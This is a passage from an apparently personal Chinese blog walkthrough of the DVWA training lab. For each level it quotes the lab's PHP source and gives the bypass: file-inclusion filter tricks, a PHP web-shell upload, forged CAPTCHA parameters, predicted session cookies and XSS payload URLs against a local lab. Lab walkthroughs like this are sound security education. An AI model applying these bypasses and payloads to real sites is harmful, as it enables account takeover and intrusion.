title="High"></a>High</h3><p>要用到xss攻击，目前不会</p><h2 id="0x05-File-Inclusion"><a href="#0x05-File-Inclusion" class="headerlink" title="0x05 File Inclusion"></a>0x05 File Inclusion</h2><hr><p><a href="https://blog.csdn.net/cldimd/article/details/104994497">原理解释</a></p><hr><h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><p>不知道怎么演示，直接copy吧：<a href="https://www.cnblogs.com/chadlas/articles/15719775.html">全等级做法</a></p><h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// Input validation</span><span class="token comment">//将参数中的http:// https:// ../ ..\都替换成空</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"http://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"https://"</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"..\""</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加了些过滤，将“http:&#x2F;&#x2F;”，“https:&#x2F;&#x2F;”，“..&#x2F;”，“..\”全部替换成了空，这个地方其实可以考虑双写绕过。<br>和Low的做法原理一样，我们可以构造url为<code>?page=hthttp://tp://www.baidu.com</code>,过滤后为<code>http://www.baidu.com</code>等等</p><h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// The page we wish to display</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'page'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// Input validation</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fnmatch</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"file*"</span><span class="token punctuation">,</span> <span class="token variable">$file</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"include.php"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// This isn't the page we want!</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR: File not found!"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里设置只能以file开头才能通过判定，需要使用伪协议：file:&#x2F;&#x2F;（访问本地文件系统）给出参考<a href="https://blog.csdn.net/Wu000999/article/details/101925271">文章</a><br>需要知道绝对路径,例子都在给出的师傅博客里有了,这里就不列举了。</p><h2 id="0x06-File-Upload"><a href="#0x06-File-Upload" class="headerlink" title="0x06 File Upload"></a>0x06 File Upload</h2><hr><h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><p>在upload-lab时已经讲的很清楚了，直接上传shell.php附带木马然后用蚁剑连接就行</p><h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><p>只能上传png和jpg格式的文件，我们只需要将php文件改为png文件正常上传抓包，把修改后缀回php即可</p><h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><p>上传图片马即可</p><h2 id="0x07-Insecure-CAPTCHA"><a href="#0x07-Insecure-CAPTCHA" class="headerlink" title="0x07 Insecure CAPTCHA"></a>0x07 Insecure CAPTCHA</h2><hr><p>ps：这题网上的解析也很少，主要看代码进行分析漏洞，不好讲</p><hr><p><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/35.png"></p><ul><li>验证流程：用户首先访问网页，触发页面的验证码的js模块，向谷歌服务器发起请求，谷歌服务器将验证码发给用户。用户输入验证码发送数据回去，这里发给的是访问网站的服务器，网站的服务器拿到验证码后，再去访问谷歌的服务器，谷歌的服务器会判断验证码是否正确，再将结果返回给网站服务器。</li></ul><p>但是这题没有用到验证码什么的，只是说要怎么绕过验证码验证，实际上页面也没有给出验证码的窗口输入</p><h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><p>部分源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//第一阶段，验证身份，验证阶段为step</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'step'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Hide the CAPTCHA form</span><span class="token comment">//隐藏验证码表单</span>    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>……<span class="token comment">//第二阶段，检查两次密码是否一致，并更新密码</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'step'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'2'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Hide the CAPTCHA form</span>    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里分两步走，第一步是验证验证码的正确性，第二步是修改密码，通过抓包我们可以看到页面上传了个step参数&#x3D;1：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/34.png"><br>改成2绕过第一个判定，直接进行第二步修改密码</p><h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'step'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'2'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Hide the CAPTCHA form</span>    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Check to see if they did stage 1</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'passed_captcha'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$html</span>     <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre>&lt;br />You have not passed the CAPTCHA.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>if( !$_POST[ ‘passed_captcha’ ] )对passed_captcha进行了判断，但是这个值本来由Google判定是否正确再返回给服务器，但这里我们连验证码都没有申请何来判定，于是我们直接给它加上参数，抓包添加如下：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/36.png"></p><h3 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Hide the CAPTCHA form</span>    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Check CAPTCHA from 3rd party</span>    <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token function">recaptcha_check_answer</span><span class="token punctuation">(</span>        <span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'recaptcha_private_key'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'g-recaptcha-response'</span><span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token variable">$resp</span> <span class="token operator">||</span>         <span class="token punctuation">(</span>            <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'g-recaptcha-response'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'hidd3n_valu3'</span>            <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_USER_AGENT'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'reCAPTCHA'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看到，它把第一二步给合并了，但是给了我们另外一个绕过的就会就是（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了显然我们不可能去通过第一个验证（因为我们没有验证码），但是我们将后面两个参数给填上就可以了：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/37.png"></p><h2 id="0x08-Weak-Session-IDs"><a href="#0x08-Weak-Session-IDs" class="headerlink" title="0x08 Weak Session IDs"></a>0x08 Weak Session IDs</h2><hr><p>Weak Session IDs（弱会话），用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。用户拿到 session id 后就会保存到 cookies 上，之后只要拿着 cookies 再访问服务器，服务器就知道你是谁了。</p><h3 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//服务器每次生成的session_id加1给客户端</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里会将SESSION[‘last_session_id’]的值+1作为cookie值<br>我们只要抓包放包，再抓包就可以看到它的session_id值：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/38.png"><br>把他复制下来，清空浏览器的cookie值，重开新页面，用HackBar送我们复制的cookie值就可以骗过服务器，绕过密码登入</p><h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是通过时间戳来形成dvwaSession的，<a href="https://tool.lu/timestamp/">在线工具</a>，和Low一样把dvwaSession改改就行了，可以伪造CSRF，这个是引导受害者在某个时间点进行点击的</p><h3 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token variable">$cookie_value</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'last_session_id_high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"dvwaSession"</span><span class="token punctuation">,</span> <span class="token variable">$cookie_value</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/vulnerabilities/weak_id/"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>setcookie函数参数如下：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/39.png"><br>对session_id进行md5加密，放包后我们只要把刚刚session解密+1，重新加密构造payload和Low是一样的做法</p><h2 id="0x08-DOM-Based-Cross-Site-Scripting-XSS"><a href="#0x08-DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="0x08  DOM Based Cross Site Scripting (XSS)"></a>0x08  DOM Based Cross Site Scripting (XSS)</h2><hr><p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p><h3 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment"># No protections, anything goes</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没开任何保护，在url直接输入JavaScript代码<code>http://127.0.0.1/dvwa-master/vulnerabilities/xss_d/?default=&lt;script&gt;alert(666)&lt;/script&gt;</code><br>如图输出666<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/40.png"></p><h3 id="Meidum"><a href="#Meidum" class="headerlink" title="Meidum"></a>Meidum</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// Is there any input?</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment"># Do not allow script tags</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span> <span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。<br>提示：如果指定数组的时候省略了键名，将会生成从 0 开始并以 1 递增的整数键名<br>array_key_exists(key,array)<br>key 必需    规定键名。<br>array    必需。规定数组</p></li><li><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>stripos(string,find,start)<br>string 必需    规定被搜索的字符串。<br>find 必需    规定要查找的字符。<br>start 可选    规定开始搜索的位置。<br>返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。</p></li><li><p>header() 函数向客户端发送原始的 HTTP 报头<br>header(string,replace,http_response_code)<br>string 必需    规定要发送的报头字符串。<br>replace 可选    指示该报头是否替换之前的报头，或添加第二个报头。<br>默认是 true（替换）。false（允许相同类型的多个报头）。<br>http_response_code可选    把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</p></li></ul><p>这里过滤掉了&lt;script，当函数匹配到 &lt;script 字符串的时候就会将URL后面的参数修正为 ?default&#x3D;English，并且stripos 防止大小写绕过</p><h4 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h4><p>在default添加#意味着后面的代码不会上传服务器<br>构造url：<code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/#?default=&lt;script&gt;alert(666)&lt;/script&gt;</code>这里我kali里用本机ip会成功但是在物理机里不会成功</p><h4 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h4><p>构造url：<code>http://127.0.0.1/dvwa-master/vulnerabilities/xss_r/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(666)&gt;</code>在这里可以通过onerror事件，在装载文档或图像的过程中如果发生了错误就会触发(大哥写的代码我也看不懂，目前不会html语言)and我确定我物理机上的靶场有点问题，kali是成功的。</p><h3 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// Is there any input?</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"default"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_null</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'default'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment"># White list the alLowable languages</span><span class="token comment">//白名单，只允许French、English、German、Spanish</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string double-quoted-string">"French"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string double-quoted-string">"English"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string double-quoted-string">"German"</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string double-quoted-string">"Spanish"</span><span class="token punctuation">:</span>            <span class="token comment"># ok</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: ?default=English"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很清楚这里是白名单，如果default不为几个语言中的一个，就会强制把default设为English<br>可以用Medium的方法一做，url&#x3D;<code>http://127.0.0.1/dvwa-master/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert(666)&lt;/script&gt;</code></p><h2 id="0x09-Reflected-Cross-Site-Scripting-XSS"><a href="#0x09-Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="0x09 Reflected Cross Site Scripting (XSS)"></a>0x09 Reflected Cross Site Scripting (XSS)</h2><hr><p>反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的data URI编码，后端解析用户输入处理后返回给前端，由浏览器解析这段XSS脚本，触发XSS漏洞。因此如果要避免反射性XSS，则必须需要后端的协调，在后端解析前端的数据时首先做相关的字串检测和转义处理；同时前端同样也许针对用户的数据做excape转义，保证数据源的可靠性</p><p>基本原理就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。</p><p>特点是：非持久化 必须用户点击带有特定参数的链接才能引起。<br>XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。</p><h3 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Is there any input?</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token 